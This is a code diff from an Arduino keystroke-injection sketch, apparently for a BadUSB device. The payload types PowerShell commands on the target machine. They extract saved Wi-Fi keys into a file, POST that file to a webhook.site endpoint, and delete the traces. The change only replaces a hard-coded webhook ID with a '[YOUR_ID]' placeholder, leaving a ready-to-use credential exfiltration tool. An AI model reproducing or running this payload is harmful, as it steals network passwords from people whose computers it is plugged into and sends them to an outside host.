@@ -30,7 +30,7 @@ void setup() {
   Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-FiPASS.txt");
   Keyboard.write(0xB0);
   delay(300);
-  Keyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/6d5b5524-cfb6-44b0-8fe8-5de50bd39e6b -Method POST -InFile Wi-FiPASS.txt -ContentType: text/plain");
+  Keyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/[YOUR_ID] -Method POST -InFile Wi-FiPASS.txt -ContentType: text/plain");
   Keyboard.write(0xB0);
   delay(3000);
   Keyboard.println("del WI-Fi*");
